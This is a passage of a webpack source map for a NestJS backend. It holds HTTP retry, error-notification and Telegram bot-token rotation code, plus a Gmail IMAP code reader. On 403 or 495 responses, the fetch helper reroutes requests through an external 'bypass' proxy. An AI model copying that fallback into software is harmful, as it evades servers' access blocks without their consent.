channelId: data.channelId,\n            token: data.botTokens[data.lastUsedIndex],\n        };\n    }\n\n    public async sendMessage(category: ChannelCategory, message: string): Promise<void> {\n        this.assertInitialized();\n\n        const data = this.categoryMap.get(category);\n        if (!data || data.botTokens.length === 0) {\n            throw new Error(`No valid bots for ${category}`);\n        }\n\n        data.lastUsedIndex = (data.lastUsedIndex + 1) % data.botTokens.length;\n        const token = data.botTokens[data.lastUsedIndex];\n        const channelId = data.channelId;\n        const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${channelId}&text=${encodeURIComponent(message)}`;\n\n        axios.post(url).catch(error => {\n            console.error(`Failed to send message to ${channelId}:`, error);\n        });\n    }\n\n    public getAllBotUsernames(category: ChannelCategory): string[] {\n        this.assertInitialized();\n\n        const data = this.categoryMap.get(category);\n        if (!data || data.botUsernames.length === 0) {\n            throw new Error(`No valid bots for ${category}`);\n        }\n\n        return [...data.botUsernames];\n    }\n\n    private assertInitialized() {\n        if (!this.initialized) {\n            throw new Error('BotConfig not initialized. App module has not finished initializing.');\n        }\n    }\n}\n","import axios, { AxiosRequestConfig, AxiosResponse } from \"axios\";\r\nimport { extractMessage, parseError } from \"./parseError\";\r\nimport { ppplbot } from \"./logbots\";\r\nimport { sleep } from \"../utils\";\r\n\r\n// Configuration types\r\ninterface RetryConfig {\r\n    maxRetries: number;\r\n    baseDelay: number;\r\n    maxDelay: number;\r\n    jitterFactor: number;\r\n}\r\n\r\ninterface NotificationConfig {\r\n    enabled: boolean;\r\n    channelEnvVar: string;\r\n    timeout: number;\r\n}\r\n\r\n// Default configurations\r\nconst DEFAULT_RETRY_CONFIG: RetryConfig = {\r\n    maxRetries: 3,\r\n    baseDelay: 500, // Start with 500ms\r\n    maxDelay: 30000, // Cap at 30 seconds\r\n    jitterFactor: 0.2, // Add up to 20% jitter\r\n};\r\n\r\nconst DEFAULT_NOTIFICATION_CONFIG: NotificationConfig = {\r\n    enabled: true,\r\n    channelEnvVar: 'httpFailuresChannel',\r\n    timeout: 5000,\r\n};\r\n\r\n/**\r\n * Sends error notifications to configured channels\r\n * @param prefix - Notification message prefix\r\n * @param errorDetails - Error details to include in notification\r\n * @param config - Notification configuration\r\n * @returns Promise that resolves when notification is sent\r\n */\r\nasync function notifyInternal(\r\n    prefix: string,\r\n    errorDetails: { message: any; status?: number },\r\n    config: NotificationConfig = DEFAULT_NOTIFICATION_CONFIG\r\n): Promise<void> {\r\n    if (!config.enabled) return;\r\n    prefix = `${prefix} ${process.env.clientId || 'uptimeChecker2'}`;\r\n    try {\r\n        const errorMessage = typeof errorDetails.message === 'string'\r\n            ? errorDetails.message\r\n            : JSON.stringify(errorDetails.message);\r\n\r\n        const formattedMessage = errorMessage.includes('ETIMEDOUT') ? 'Connection timed out' :\r\n            errorMessage.includes('ECONNREFUSED') ? 'Connection refused' :\r\n                extractMessage(errorDetails?.message);\r\n\r\n        console.error(`${prefix}\\n${formattedMessage}`);\r\n\r\n        // Skip notification for rate limiting errors\r\n        if (errorDetails.status === 429) return;\r\n\r\n        const notificationText = `${prefix}\\n\\n${formattedMessage}`;\r\n\r\n        try {\r\n            const channelUrl = ppplbot(process.env[config.channelEnvVar] || '');\r\n            if (!channelUrl) {\r\n                console.warn(`Notification channel URL not available. Environment variable ${config.channelEnvVar} might not be set.`);\r\n                return;\r\n            }\r\n\r\n            const notifUrl = `${channelUrl}&text=${encodeURIComponent(notificationText)}`;\r\n            await axios.get(notifUrl, { timeout: config.timeout });\r\n        } catch (error) {\r\n            console.error(\"Failed to send notification:\", error);\r\n        }\r\n    } catch (error) {\r\n        console.error(\"Error in notification process:\", error);\r\n    }\r\n}\r\n\r\n/**\r\n * Common network errors that should trigger retries\r\n */\r\nconst RETRYABLE_NETWORK_ERRORS = [\r\n    'ETIMEDOUT',\r\n    'ECONNABORTED',\r\n    'ECONNREFUSED',\r\n    'ECONNRESET',\r\n    'ERR_NETWORK',\r\n    'ERR_BAD_RESPONSE',\r\n    'EHOSTUNREACH',\r\n    'ENETUNREACH'\r\n];\r\n\r\n/**\r\n * HTTP status codes that should trigger retries\r\n */\r\nconst RETRYABLE_STATUS_CODES = [408, 500, 502, 503, 504];\r\n\r\n/**\r\n * Determines if an error should trigger a retry\r\n * @param error - The axios error\r\n * @param parsedError - Parsed error with status code\r\n * @returns boolean indicating whether to retry the request\r\n */\r\nfunction shouldRetry(error: unknown, parsedError: { status: number }): boolean {\r\n    if (axios.isAxiosError(error)) {\r\n        if (error.code && RETRYABLE_NETWORK_ERRORS.includes(error.code)) {\r\n            return true;\r\n        }\r\n\r\n        if (error.message?.toLowerCase().includes('timeout')) {\r\n            return true;\r\n        }\r\n    }\r\n\r\n    return RETRYABLE_STATUS_CODES.includes(parsedError.status);\r\n}\r\n\r\n/**\r\n * Calculates backoff time for retry attempts\r\n * @param attempt - Current attempt number (0-based)\r\n * @param config - Retry configuration\r\n * @returns Delay in milliseconds before next retry\r\n */\r\nfunction calculateBackoff(attempt: number, config: RetryConfig = DEFAULT_RETRY_CONFIG): number {\r\n    const base = Math.min(config.baseDelay * Math.pow(2, attempt), config.maxDelay);\r\n    const jitter = Math.random() * (base * config.jitterFactor);\r\n    return Math.floor(base + jitter);\r\n}\r\n\r\n/**\r\n * Makes a request through a bypass service when regular requests fail with certain errors\r\n * @param url - Target URL\r\n * @param options - Request options\r\n * @returns Axios response from bypass service\r\n */\r\nasync function makeBypassRequest(\r\n    url: string,\r\n    options: AxiosRequestConfig & { bypassUrl?: string }\r\n): Promise<AxiosResponse> {\r\n    const bypassUrl = options.bypassUrl || process.env.bypassURL || '';\r\n\r\n    if (!bypassUrl) {\r\n        throw new Error('Bypass URL is not provided');\r\n    }\r\n\r\n    const finalBypassUrl = bypassUrl.startsWith('http') ?\r\n        bypassUrl :\r\n        'https://ravishing-perception-production.up.railway.app/execute-request';\r\n\r\n    const bypassAxios = axios.create({\r\n        responseType: options.responseType || 'json',\r\n        maxContentLength: Infinity,\r\n        maxBodyLength: Infinity,\r\n        timeout: options.timeout || 30000\r\n    });\r\n\r\n    const response = await bypassAxios.post(finalBypassUrl, {\r\n        url,\r\n        method: options.method,\r\n        headers: options.headers,\r\n        data: options.data,\r\n        params: options.params,\r\n        responseType: options.responseType,\r\n        timeout: options.timeout,\r\n        followRedirects: options.maxRedirects !== 0,\r\n        maxRedirects: options.maxRedirects\r\n    }, {\r\n        headers: {\r\n            'Content-Type': 'application/json',\r\n            ...options.headers\r\n        }\r\n    });\r\n\r\n    // Handle binary responses\r\n    if (response && (\r\n        options.responseType === 'arraybuffer' ||\r\n        response.headers['content-type']?.includes('application/octet-stream') ||\r\n        response.headers['content-type']?.includes('image/') ||\r\n        response.headers['content-type']?.includes('audio/') ||\r\n        response.headers['content-type']?.includes('video/') ||\r\n        response.headers['content-type']?.includes('application/pdf'))) {\r\n\r\n        response.data = Buffer.from(response.data);\r\n    }\r\n\r\n    return response;\r\n}\r\n\r\n/**\r\n * Parses a URL and extracts host and endpoint information\r\n * @param url - URL to parse\r\n * @returns Object containing host and endpoint\r\n */\r\nfunction parseUrl(url: string): { host: string; endpoint: string } | null {\r\n    if (!url || typeof url !== 'string') {\r\n        return null;\r\n    }\r\n\r\n    try {\r\n        const parsedUrl = new URL(url);\r\n        return {\r\n            host: parsedUrl.host,\r\n            endpoint: parsedUrl.pathname + parsedUrl.search\r\n        };\r\n    } catch (error) {\r\n        return null;\r\n    }\r\n}\r\n\r\n/**\r\n * Extended options for fetch requests\r\n */\r\ninterface FetchWithTimeoutOptions extends AxiosRequestConfig {\r\n    bypassUrl?: string;\r\n    retryConfig?: RetryConfig;\r\n    notificationConfig?: NotificationConfig;\r\n}\r\n\r\n/**\r\n * Makes HTTP requests with timeout handling and retry logic\r\n * @param url - Target URL\r\n * @param options - Request options with custom extensions\r\n * @returns Promise resolving to Axios response or undefined if all retries fail\r\n */\r\nexport async function fetchWithTimeout(\r\n    url: string,\r\n    options: FetchWithTimeoutOptions = {},\r\n    maxRetries?: number // Kept for backward compatibility\r\n): Promise<AxiosResponse | undefined> {\r\n    // Input validation\r\n    if (!url) {\r\n        console.error('URL is empty');\r\n        return undefined;\r\n    }\r\n\r\n    // Merge default and custom configurations\r\n    const retryConfig: RetryConfig = {\r\n        ...DEFAULT_RETRY_CONFIG,\r\n        ...options.retryConfig,\r\n        maxRetries: maxRetries !== undefined ? maxRetries : (options.retryConfig?.maxRetries || DEFAULT_RETRY_CONFIG.maxRetries)\r\n    };\r\n\r\n    const notificationConfig: NotificationConfig = {\r\n        ...DEFAULT_NOTIFICATION_CONFIG,\r\n        ...options.notificationConfig\r\n    };\r\n\r\n    // Initialize request options with defaults\r\n    options.timeout = options.timeout || 30000;\r\n    options.method = options.method || \"GET\";\r\n\r\n    // Parse URL for error reporting\r\n    const urlInfo = parseUrl(url);\r\n    if (!urlInfo) {\r\n        console.error(`Invalid URL: ${url}`);\r\n        return undefined;\r\n    }\r\n\r\n    const { host, endpoint } = urlInfo;\r\n    const clientId = process.env.clientId || 'UnknownClient';\r\n\r\n    // Main retry loop\r\n    let lastError: Error | null = null;\r\n\r\n    for (let attempt = 0; attempt <= retryConfig.maxRetries; attempt++) {\r\n        // Create controller for this attempt\r\n        const controller = new AbortController();\r\n        const currentTimeout = options.timeout + (attempt * 5000);\r\n\r\n        // Set up timeout to abort the request if it takes too long\r\n        const timeoutId = setTimeout(() => {\r\n            try {\r\n                controller.abort();\r\n            } catch (abortError) {\r\n                console.error(\"Error during abort:\", abortError);\r\n            }\r\n        }, currentTimeout);\r\n\r\n        try {\r\n            // Make the request\r\n            const response = await axios({\r\n                ...options,\r\n                url,\r\n                signal: controller.signal,\r\n                maxRedirects: options.maxRedirects ?? 5,\r\n                timeout: currentTimeout,\r\n            });\r\n\r\n            // Success! Clean up and return response\r\n            clearTimeout(timeoutId);\r\n            return response;\r\n\r\n        } catch (error) {\r\n            // Clean up timeout\r\n            clearTimeout(timeoutId);\r\n\r\n            // Process error and determine if retry is needed\r\n            lastError = error instanceof Error ? error : new Error(String(error));\r\n\r\n            // Try to parse the error for better handling\r\n            let parsedError;\r\n            try {\r\n                parsedError = parseError(error, `host: ${host}\\nendpoint:${endpoint}`, false);\r\n            } catch (parseErrorError) {\r\n                console.error(\"Error in parseError:\", parseErrorError);\r\n                parsedError = { status: 500, message: String(error), error: \"ParseError\" };\r\n            }\r\n\r\n            // Extract message for notifications\r\n            const message = parsedError.message;\r\n\r\n            // Check if it's a timeout\r\n            const isTimeout = axios.isAxiosError(error) && (\r\n                error.code === \"ECONNABORTED\" ||\r\n                (message && message.includes(\"timeout\")) ||\r\n                parsedError.status === 408\r\n            );\r\n\r\n            // Handle 403/495 with bypass\r\n            if (parsedError.status === 403 || parsedError.status === 495) {\r\n                try {\r\n                    const bypassResponse = await makeBypassRequest(url, options);\r\n                    if (bypassResponse) {\r\n                        await notifyInternal(\r\n                            `Successfully Bypassed the request`,\r\n                            { message: `${clientId} host=${host}\\nendpoint=${endpoint}` },\r\n                            notificationConfig\r\n                        );\r\n                        return bypassResponse;\r\n                    }\r\n                } catch (bypassError) {\r\n                    let errorDetails;\r\n                    try {\r\n                        const bypassParsedError = parseError(bypassError, `host: ${host}\\nendpoint:${endpoint}`, false);\r\n                        errorDetails = extractMessage(bypassParsedError);\r\n                    } catch (extractBypassError) {\r\n                        console.error(\"Error extracting bypass error message:\", extractBypassError);\r\n                        errorDetails = String(bypassError);\r\n                    }\r\n\r\n                    await notifyInternal(\r\n                        `Bypass attempt failed`,\r\n                        { message: `host=${host}\\nendpoint=${endpoint}\\n${`msg: ${errorDetails.slice(0, 150)}`}` },\r\n                        notificationConfig\r\n                    );\r\n                }\r\n            } else {\r\n                // Notify about the error\r\n                if (isTimeout) {\r\n                    await notifyInternal(\r\n                        `Request timeout on attempt ${attempt}`,\r\n                        {\r\n                            message: `${clientId} host=${host}\\nendpoint=${endpoint}\\ntimeout=${options.timeout}ms`,\r\n                            status: 408\r\n                        },\r\n                        notificationConfig\r\n                    );\r\n                } else {\r\n                    await notifyInternal(\r\n                        `Attempt ${attempt} failed`,\r\n                        {\r\n                            message: `${clientId} host=${host}\\nendpoint=${endpoint}\\n${`mgs: ${message.slice(0, 150)}`}`,\r\n                            status: parsedError.status\r\n                        },\r\n                        notificationConfig\r\n                    );\r\n                }\r\n            }\r\n\r\n            // Check if we should retry\r\n            if (attempt < retryConfig.maxRetries && shouldRetry(error, parsedError)) {\r\n                const delay = calculateBackoff(attempt, retryConfig);\r\n                console.log(`Retrying request (${attempt + 1}/${retryConfig.maxRetries}) after ${delay}ms`);\r\n                await sleep(delay);\r\n                continue;\r\n            }\r\n\r\n            // If this is the last attempt, break out of the loop\r\n            if (attempt >= retryConfig.maxRetries) {\r\n                break;\r\n            }\r\n        }\r\n    }\r\n\r\n    // If we get here, all retries failed\r\n    try {\r\n        let errorData;\r\n        try {\r\n            if (lastError) {\r\n                const parsedLastError = parseError(lastError, `${clientId} host: ${host}\\nendpoint:${endpoint}`, false);\r\n                errorData = extractMessage(parsedLastError);\r\n            } else {\r\n                errorData = 'Unknown error';\r\n            }\r\n        } catch (extractLastError) {\r\n            console.error(\"Error extracting last error:\", extractLastError);\r\n            errorData = String(lastError) || 'Unknown error';\r\n        }\r\n\r\n        await notifyInternal(\r\n            `All ${retryConfig.maxRetries} retries exhausted`,\r\n            { message: `${errorData.slice(0, 150)}` },\r\n            notificationConfig\r\n        );\r\n    } catch (finalError) {\r\n        console.error('Failed to send final error notification:', finalError);\r\n    }\r\n\r\n    // Return undefined to indicate failure\r\n    return undefined;\r\n}","const getBotTokens = () => {\r\n    const botTokens = (process.env.BOT_TOKENS || '').split(',').filter(Boolean);\r\n    if (botTokens.length === 0) {\r\n        throw new Error('No bot tokens configured. Please set BOT_TOKENS environment variable');\r\n    }\r\n    return botTokens;\r\n};\r\n\r\nlet botTokens: string[] | null = null;\r\nlet currentTokenIndex = 0;\r\n\r\nconst initializeBotTokens = () => {\r\n    if (botTokens === null) {\r\n        botTokens = getBotTokens();\r\n    }\r\n    return botTokens;\r\n};\r\n\r\nexport function getBotToken() {\r\n    return initializeBotTokens()[currentTokenIndex];\r\n}\r\n\r\nexport function notifbot(chatId: string = process.env.accountsChannel || \"-1001801844217\", botToken?: string): string {\r\n    const tokens = initializeBotTokens();\r\n    const token = botToken || tokens[currentTokenIndex];\r\n    const apiUrl = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}`;\r\n\r\n    if (!botToken) {\r\n        currentTokenIndex = (currentTokenIndex + 1) % tokens.length;\r\n    }\r\n\r\n    return apiUrl;\r\n}\r\n\r\nexport function ppplbot(chatId: string = process.env.updatesChannel || '-1001972065816', botToken?: string): string {\r\n    const tokens = initializeBotTokens();\r\n    const token = botToken || tokens[currentTokenIndex];\r\n    const apiUrl = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}`;\r\n\r\n    if (!botToken) {\r\n        currentTokenIndex = (currentTokenIndex + 1) % tokens.length;\r\n    }\r\n\r\n    return apiUrl;\r\n}\r\n","import { notifbot } from \"./logbots\";\r\nimport axios, { AxiosError, AxiosResponse } from \"axios\";\r\n\r\n/**\r\n * Error response interface for standardized error format\r\n */\r\ninterface ErrorResponse {\r\n  status: number;\r\n  message: string;\r\n  error: string;\r\n  raw?: any;\r\n}\r\n\r\n/**\r\n * Configuration options for error handling\r\n */\r\ninterface ErrorHandlingConfig {\r\n  maxMessageLength: number;\r\n  notificationTimeout: number;\r\n  ignorePatterns: RegExp[];\r\n  defaultStatus: number;\r\n  defaultMessage: string;\r\n  defaultError: string;\r\n}\r\n\r\n// Default configuration for error handling\r\nconst DEFAULT_ERROR_CONFIG: ErrorHandlingConfig = {\r\n  maxMessageLength: 200,\r\n  notificationTimeout: 10000,\r\n  ignorePatterns: [\r\n    /INPUT_USER_DEACTIVATED/i,\r\n    /too many req/i,\r\n    /could not find/i,\r\n    /ECONNREFUSED/i\r\n  ],\r\n  defaultStatus: 500,\r\n  defaultMessage: 'An unknown error occurred',\r\n  defaultError: 'UnknownError'\r\n};\r\n\r\n/**\r\n * Safely stringifies objects of any depth\r\n * @param data - Data to stringify\r\n * @param depth - Current recursion depth\r\n * @param maxDepth - Maximum recursion depth\r\n * @returns String representation of data\r\n */\r\nfunction safeStringify(data: any, depth = 0, maxDepth = 3): string {\r\n  if (depth > maxDepth) {\r\n    return '[Max Depth Reached]';\r\n  }\r\n\r\n  try {\r\n    if (data === null || data === undefined) {\r\n      return String(data);\r\n    }\r\n\r\n    if (typeof data === 'string' || typeof data === 'number' || typeof data === 'boolean') {\r\n      return String(data);\r\n    }\r\n\r\n    if (data instanceof Error) {\r\n      return data.message || data.toString();\r\n    }\r\n\r\n    if (Array.isArray(data)) {\r\n      if (data.length === 0) return '[]';\r\n      return `[${data.map(item => safeStringify(item, depth + 1, maxDepth)).join(', ')}]`;\r\n    }\r\n\r\n    if (typeof data === 'object') {\r\n      const entries = Object.entries(data)\r\n        .filter(([_, v]) => v !== undefined && v !== null)\r\n        .map(([k, v]) => `${k}: ${safeStringify(v, depth + 1, maxDepth)}`);\r\n      \r\n      if (entries.length === 0) return '{}';\r\n      return `{${entries.join(', ')}}`;\r\n    }\r\n\r\n    return String(data);\r\n  } catch (error) {\r\n    return `[Error Stringifying: ${error instanceof Error ? error.message : String(error)}]`;\r\n  }\r\n}\r\n\r\n/**\r\n * Extracts meaningful message from nested data structure\r\n * @param data - The data to extract messages from\r\n * @param path - Current object path for nested values\r\n * @param maxDepth - Maximum depth to traverse\r\n * @returns Extracted message as string\r\n */\r\nexport function extractMessage(data: any, path = '', depth = 0, maxDepth = 5): string {\r\n  try {\r\n    // Prevent excessive recursion\r\n    if (depth > maxDepth) {\r\n      return `${path}=[Max Depth Reached]`;\r\n    }\r\n\r\n    // Handle simple types directly\r\n    if (data === null || data === undefined) {\r\n      return '';\r\n    }\r\n\r\n    if (typeof data === 'string' || typeof data === 'number' || typeof data === 'boolean') {\r\n      return path ? `${path}=${data}` : String(data);\r\n    }\r\n\r\n    // Handle Error objects\r\n    if (data instanceof Error) {\r\n      const errorInfo = [\r\n        data.message ? `message=${data.message}` : '',\r\n        data.name ? `name=${data.name}` : '',\r\n        data.stack ? `stack=${data.stack.split('\\n')[0]}` : ''\r\n      ].filter(Boolean).join('\\n');\r\n      \r\n      return path ? `${path}=(${errorInfo})` : errorInfo;\r\n    }\r\n\r\n    // Handle arrays\r\n    if (Array.isArray(data)) {\r\n      if (data.length === 0) {\r\n        return '';\r\n      }\r\n\r\n      return data\r\n        .map((item, index) => extractMessage(item, path ? `${path}[${index}]` : `[${index}]`, depth + 1, maxDepth))\r\n        .filter(Boolean)\r\n        .join('\\n');\r\n    }\r\n\r\n    // Handle objects\r\n    if (typeof data === 'object') {\r\n      const messages: string[] = [];\r\n\r\n      for (const key of Object.keys(data)) {\r\n        const value = data[key];\r\n        const newPath = path ? `${path}.${key}` : key;\r\n        \r\n        const extracted = extractMessage(value, newPath, depth + 1, maxDepth);\r\n        if (extracted) {\r\n          messages.push(extracted);\r\n        }\r\n      }\r\n\r\n      return messages.join('\\n');\r\n    }\r\n\r\n    // Fallback\r\n    return '';\r\n  } catch (error) {\r\n    console.error(\"Error in extractMessage:\", error);\r\n    return `Error extracting message: ${error instanceof Error ? error.message : String(error)}`;\r\n  }\r\n}\r\n\r\n/**\r\n * Sends an HTTP notification\r\n * @param url - URL to send notification to\r\n * @param timeout - Request timeout in ms\r\n * @returns Promise resolving to response or undefined on error\r\n */\r\nasync function sendNotification(url: string, timeout = DEFAULT_ERROR_CONFIG.notificationTimeout): Promise<AxiosResponse | undefined> {\r\n  try {\r\n    // Validate URL before sending\r\n    if (!url || typeof url !== 'string' || !url.startsWith('http')) {\r\n      console.error(\"Invalid notification URL:\", url);\r\n      return undefined;\r\n    }\r\n\r\n    return await axios.get(url, { \r\n      timeout,\r\n      validateStatus: status => status < 500 // Consider 4xx as \"successful\" notifications\r\n    });\r\n  } catch (error) {\r\n    console.error(\"Failed to send notification:\", error instanceof Error ? error.message : String(error));\r\n    return undefined;\r\n  }\r\n}\r\n\r\n/**\r\n * Checks if an error should be ignored for notification\r\n * @param message - Error message to check\r\n * @param status - HTTP status code\r\n * @param patterns - RegExp patterns to ignore\r\n * @returns Boolean indicating if error should be ignored\r\n */\r\nfunction shouldIgnoreError(message: string, status: number, patterns: RegExp[]): boolean {\r\n  if (status === 429) return true;  // Always ignore rate limiting errors\r\n  \r\n  return patterns.some(pattern => pattern.test(message));\r\n}\r\n\r\n/**\r\n * Extracts status code from error or response object\r\n * @param err - Error object to parse\r\n * @param defaultStatus - Default status code if none found\r\n * @returns HTTP status code\r\n */\r\nfunction extractStatusCode(err: any, defaultStatus: number): number {\r\n  if (!err) return defaultStatus;\r\n\r\n  // Try to extract from response\r\n  if (err.response) {\r\n    const response = err.response;\r\n    return response.data?.statusCode || \r\n           response.data?.status || \r\n           response.data?.ResponseCode || \r\n           response.status || \r\n           err.status || \r\n           defaultStatus;\r\n  }\r\n  \r\n  // Try direct properties\r\n  return err.statusCode || err.status || defaultStatus;\r\n}\r\n\r\n/**\r\n * Extracts error message from error or response object\r\n * @param err - Error object to parse\r\n * @param defaultMessage - Default message if none found\r\n * @returns Extracted error message\r\n */\r\nfunction extractErrorMessage(err: any, defaultMessage: string): string {\r\n  if (!err) return defaultMessage;\r\n\r\n  // Error message from response\r\n  if (err.response?.data) {\r\n    const responseData = err.response.data;\r\n    return responseData.message ||\r\n           responseData.errors ||\r\n           responseData.ErrorMessage ||\r\n           responseData.errorMessage ||\r\n           responseData.UserMessage ||\r\n           (typeof responseData === 'string' ? responseData : null) ||\r\n           err.response.statusText ||\r\n           err.message ||\r\n           defaultMessage;\r\n  }\r\n  \r\n  // Error message from request\r\n  if (err.request) {\r\n    return err.data?.message ||\r\n           err.data?.errors ||\r\n           err.data?.ErrorMessage ||\r\n           err.data?.errorMessage ||\r\n           err.data?.UserMessage ||\r\n           (typeof err.data === 'string' ? err.data : null) ||\r\n           err.message ||\r\n           err.statusText ||\r\n           'The request was triggered but no response was received';\r\n  }\r\n  \r\n  // Direct error message\r\n  return err.message || err.errorMessage || defaultMessage;\r\n}\r\n\r\n/**\r\n * Extracts error type from error or response object\r\n * @param err - Error object to parse\r\n * @param defaultError - Default error type if none found\r\n * @returns Error type as string\r\n */\r\nfunction extractErrorType(err: any, defaultError: string): string {\r\n  if (!err) return defaultError;\r\n\r\n  if (err.response?.data?.error) {\r\n    return err.response.data.error;\r\n  }\r\n  \r\n  return err.error || err.name || err.code || defaultError;\r\n}\r\n\r\n/**\r\n * Parses and standardizes error objects for consistent handling\r\n * @param err - Error to parse\r\n * @param prefix - Prefix to add to error message\r\n * @param sendErr - Whether to send a notification for this error\r\n * @param config - Error handling configuration\r\n * @returns Standardized error response\r\n */\r\nexport function parseError(\r\n  err: any,\r\n  prefix?: string,\r\n  sendErr: boolean = true,\r\n  config: Partial<ErrorHandlingConfig> = {}\r\n): ErrorResponse {\r\n  // Merge with default config\r\n  const fullConfig = { ...DEFAULT_ERROR_CONFIG, ...config };\r\n  \r\n  try {\r\n    const clientId = process.env.clientId || 'UptimeChecker2';\r\n    const prefixStr = `${clientId}${prefix ? ` - ${prefix}` : ''}`;\r\n    \r\n    // Extract error components\r\n    const status = extractStatusCode(err, fullConfig.defaultStatus);\r\n    const rawMessage = extractErrorMessage(err, fullConfig.defaultMessage);\r\n    const error = extractErrorType(err, fullConfig.defaultError);\r\n    \r\n    // Process the raw message to get a clean version\r\n    let extractedMessage;\r\n    try {\r\n      extractedMessage = typeof rawMessage === 'string' ? rawMessage : extractMessage(rawMessage);\r\n    } catch (e) {\r\n      extractedMessage = safeStringify(rawMessage) || 'Error extracting message';\r\n    }\r\n    \r\n    // Prepare the full message for logging\r\n    const fullMessage = `${prefixStr} :: ${extractedMessage}`;\r\n    console.log(\"parsedErr: \", fullMessage);\r\n    \r\n    // Prepare response object\r\n    const response: ErrorResponse = { \r\n      status, \r\n      message: err.errorMessage ? err.errorMessage : String(fullMessage).slice(0, fullConfig.maxMessageLength), \r\n      error,\r\n      raw: err\r\n    };\r\n    \r\n    // Send notification if requested and applicable\r\n    if (sendErr) {\r\n      try {\r\n        const ignoreError = shouldIgnoreError(fullMessage, status, fullConfig.ignorePatterns);\r\n        \r\n        if (!ignoreError) {\r\n          const notificationMessage = err.errorMessage ? err.errorMessage : extractedMessage;\r\n          const notifUrl = `${notifbot()}&text=${encodeURIComponent(prefixStr)} :: ${encodeURIComponent(notificationMessage)}`;\r\n          \r\n          // Use Promise but don't await to avoid delaying the response\r\n          sendNotification(notifUrl, fullConfig.notificationTimeout)\r\n            .catch(e => console.error(\"Failed to send error notification:\", e));\r\n        }\r\n      } catch (notificationError) {\r\n        console.error('Failed to prepare error notification:', notificationError);\r\n      }\r\n    }\r\n    \r\n    return response;\r\n  } catch (fatalError) {\r\n    console.error(\"Fatal error in parseError:\", fatalError);\r\n    return { \r\n      status: fullConfig.defaultStatus, \r\n      message: \"Error in error handling\", \r\n      error: \"FatalError\",\r\n      raw: err\r\n    };\r\n  }\r\n}\r\n\r\n/**\r\n * Type guard for Axios errors\r\n * @param error - Error to check\r\n * @returns Boolean indicating if error is an Axios error\r\n */\r\nexport function isAxiosError(error: unknown): error is AxiosError {\r\n  return axios.isAxiosError(error);\r\n}\r\n\r\n/**\r\n * Creates error objects with consistent format\r\n * @param message - Error message\r\n * @param status - HTTP status code\r\n * @param errorType - Error type\r\n * @returns Standardized error response\r\n */\r\nexport function createError(message: string, status = 500, errorType = 'ApplicationError'): ErrorResponse {\r\n  return {\r\n    status,\r\n    message,\r\n    error: errorType\r\n  };\r\n}\r\n\r\n/**\r\n * Error handling utilities for HTTP requests and responses\r\n */\r\nexport const ErrorUtils = {\r\n  parseError,\r\n  extractMessage,\r\n  sendNotification,\r\n  createError,\r\n  isAxiosError\r\n};","module.exports = require(\"@nestjs/common\");","module.exports = require(\"@nestjs/config\");","module.exports = require(\"@nestjs/core\");","module.exports = require(\"@nestjs/mapped-types\");","module.exports = require(\"@nestjs/mongoose\");","module.exports = require(\"@nestjs/platform-express\");","module.exports = require(\"@nestjs/swagger\");","module.exports = require(\"adm-zip\");","module.exports = require(\"axios\");","module.exports = require(\"big-integer\");","module.exports = require(\"class-transformer\");","module.exports = require(\"class-validator\");","module.exports = require(\"cloudinary\");","module.exports = require(\"imap\");","module.exports = require(\"mongoose\");","module.exports = require(\"multer\");","module.exports = require(\"telegram\");","module.exports = require(\"telegram/Helpers\");","module.exports = require(\"telegram/Password\");","module.exports = require(\"telegram/client/uploads\");","module.exports = require(\"telegram/events\");","module.exports = require(\"telegram/extensions/Logger\");","module.exports = require(\"telegram/sessions\");","module.exports = require(\"telegram/tl\");","module.exports = require(\"crypto\");","module.exports = require(\"fs\");","module.exports = require(\"path\");","// The module cache\nvar __webpack_module_cache__ = {};\n\n// The require function\nfunction __webpack_require__(moduleId) {\n\t// Check if module is in cache\n\tvar cachedModule = __webpack_module_cache__[moduleId];\n\tif (cachedModule !== undefined) {\n\t\treturn cachedModule.exports;\n\t}\n\t// Create a new module (and put it into the cache)\n\tvar module = __webpack_module_cache__[moduleId] = {\n\t\t// no module.id needed\n\t\t// no module.loaded needed\n\t\texports: {}\n\t};\n\n\t// Execute the module function\n\t__webpack_modules__[moduleId].call(module.exports, module, module.exports, __webpack_require__);\n\n\t// Return the exports of the module\n\treturn module.exports;\n}\n\n","// startup\n// Load entry module and return exports\n// This entry module is referenced by other modules so it can't be inlined\nvar __webpack_exports__ = __webpack_require__(7927);\n"],"names":["MailReader","isReady","result","this","imap","user","process","env","GMAIL_ADD","password","GMAIL_PASS","host","port","tls","tlsOptions","rejectUnauthorized","on","console","log","err","error","getInstance","instance","connectToMail","connect","parseError","disconnectFromMail","end","isMailReady","getCode","sleep","openInbox","searchCriteria","fetchOptions","bodies","markSeen","results","Promise","resolve","reject","search","length","fetch","msg","seqno","emailData","stream","info","buffer","chunk","toString","which","push","seq","addFlags","expunge","once","split","fetchNumbersFromString","openBox","AppController","constructor","appService","logger","Logger","getHello","executeRequest","requestDetails","res","requestId","randomUUID","startTime","Date","now","url","method","headers","data","params","responseType","timeout","followRedirects","maxRedirects","message","details","sanitizeHeaders","dataSize","JSON","stringify","response","maxContentLength","Infinity","maxBodyLength","validateStatus","decompress","status","Object","entries","forEach","key","value","toLowerCase","Array","isArray","setHeader","metrics","executionTime","contentType","includes","getHeader","send","Buffer","from","code","stack","json","sensitiveHeaders","reduce","acc","Get","Post","ApiOperation","summary","Body","ValidationPipe","transform","Res","ExecuteRequestDto","Controller","AppService","AppModule","configure","consumer","apply","LoggerMiddleware","forRoutes","Module","imports","initModule","TelegramModule","ActiveChannelsModule","ClientModule","UserDataModule","UsersModule","BufferClientModule","ArchivedClientModule","ChannelsModule","PromoteClientModule","BuildModule","UpiIdModule","PromoteMsgModule","PromoteStatModule","StatModule","Stat2Module","TgSignupModule","TransactionModule","NpointModule","TimestampModule","controllers","providers","exports","Injectable","CloudinaryService","resources","Map","cloudinary","v2","config","cloud_name","CL_NAME","api_key","CL_APIKEY","api_secret","CL_APISECRET","name","getResourcesFromFolder","downloadAndExtractZip","rootPath","cwd","zipPath","path","extractPath","fetchWithTimeout","errorMessage","Error","fs","writeFileSync","zip","extractAllTo","unlinkSync","folderName","createNewFolder","createFolder","uploadFilesToFolder","overwriteFile","uploader","upload","resource_type","overwrite","invalidate","public_id","findAndSaveResources","type","api","prefix","max_results","all","map","async","resource","set","extension","substring","lastIndexOf","mypath","join","statusText","existsSync","saveFile","create_folder","uploadPromises","upload_large","folder","printResources","val","get","publicId","getBuffer","Configuration","Schema","versionKey","autoIndex","strict","timestamps",